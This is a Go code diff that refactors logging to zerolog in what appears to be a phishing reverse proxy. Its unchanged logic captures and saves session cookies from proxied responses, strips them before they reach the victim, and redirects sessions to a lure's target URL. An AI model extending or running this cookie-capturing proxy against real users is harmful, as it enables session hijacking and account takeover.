@@ -2,11 +2,11 @@ package main
 
 import (
 	"io"
-	"log"
 	"net/http"
 	"strings"
 
 	"github.com/gofiber/fiber/v2"
+	"github.com/rs/zerolog"
 )
 
 const HeaderTargetURL = "X-Target-Url"
@@ -19,12 +19,13 @@ type ResponseProcessor interface {
 	Process(c *fiber.Ctx, resp *http.Response)
 }
 
-func NewResponseProcessor(conv DomainConverter, urlProc, htmlProc RegexProcessor,
+func NewResponseProcessor(log *zerolog.Logger, conv DomainConverter, urlProc, htmlProc RegexProcessor,
 	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
-	return &responseProcessor{conv, urlProc, htmlProc, cookieSaver, authService, lureService}
+	return &responseProcessor{log, conv, urlProc, htmlProc, cookieSaver, authService, lureService}
 }
 
 type responseProcessor struct {
+	log         *zerolog.Logger
 	conv        DomainConverter
 	urlProc     RegexProcessor
 	htmlProc    RegexProcessor
@@ -57,7 +58,7 @@ func (p *responseProcessor) targetRedirect(c *fiber.Ctx, resp *http.Response) bo
 	}
 	lure, err := p.lureService.GetByURL(sess.LureURL())
 	if err != nil {
-		log.Println("lureService error: ", err)
+		p.log.Error().Err(err).Msg("lureService error")
 		return false
 	}
 	if lure == nil {
@@ -65,8 +66,9 @@ func (p *responseProcessor) targetRedirect(c *fiber.Ctx, resp *http.Response) bo
 	}
 	contentType := p.getContentType(resp)
 	if strings.Contains(contentType, "text/html") {
-		// TODO log error
-		c.Status(fiber.StatusFound).Redirect(lure.TargetURL)
+		if err := c.Status(fiber.StatusFound).Redirect(lure.TargetURL); err != nil {
+			p.log.Error().Err(err).Str("lureURL", lure.LureURL).Msg("failed to redirect to targetURL")
+		}
 		return true
 	}
 	resp.Header[HeaderTargetURL] = []string{lure.TargetURL}
@@ -117,11 +119,13 @@ func (p *responseProcessor) writeCookies(c *fiber.Ctx, resp *http.Response) {
 		return
 	}
 	cookies := resp.Cookies()
-	for _, cookie := range cookies {
-		log.Println(resp.Request.URL, "set cookie:", cookie.String())
+	if p.log.GetLevel() <= zerolog.DebugLevel {
+		for _, cookie := range cookies {
+			p.log.Debug().Stringer("cookie", cookie).Stringer("requestURL", resp.Request.URL).Msg("set cookie")
+		}
 	}
 	if err := p.cookieSaver.SaveCookies(c, resp.Request.URL, cookies); err != nil {
-		log.Println("saveCookies error: ", err)
+		p.log.Error().Err(err).Msg("saveCookies error")
 	}
 	resp.Header.Del("Set-Cookie")
 }
